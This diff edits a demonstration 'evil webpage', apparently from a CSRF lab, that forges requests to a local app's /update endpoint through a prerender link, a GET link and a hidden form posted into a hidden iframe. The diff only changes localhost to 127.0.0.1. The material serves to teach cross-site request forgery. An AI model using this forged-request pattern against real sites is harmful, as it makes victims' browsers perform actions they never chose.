@@ -13,7 +13,7 @@
 <!--Icons-->
 <script src="/static//static/js/lumino.glyphs.js"></script>
 
-<link rel="prerender" href="http://localhost:5000/update?color=Hackzord%21"/>
+<link rel="prerender" href="http://127.0.0.1:5000/update?color=Hackzord%21"/>
 
 </head>
 
@@ -65,7 +65,7 @@
 					<div class="panel-body">
 						<div class="col-md-6">
 						<p>Welcome to my evil webpage, you have been hacked!</p>
-						<p><a href="http://localhost:5000/update?color=Hackzord%21">Try with GET method</a></p>
+						<p><a href="http://127.0.0.1:5000/update?color=Hackzord%21">Try with GET method</a></p>
                			</div>
 						</form>
 					</div>
@@ -110,7 +110,7 @@
 
 
 <iframe style="display:none" name="csrf-frame"></iframe>
-<form method='POST' action='http://localhost:5000/update' target="csrf-frame" id="csrf-form">
+<form method='POST' action='http://127.0.0.1:5000/update' target="csrf-frame" id="csrf-form">
   <input type='hidden' name='color' value='Hackzord!'>
   <input type='submit' value='submit'>
 </form>
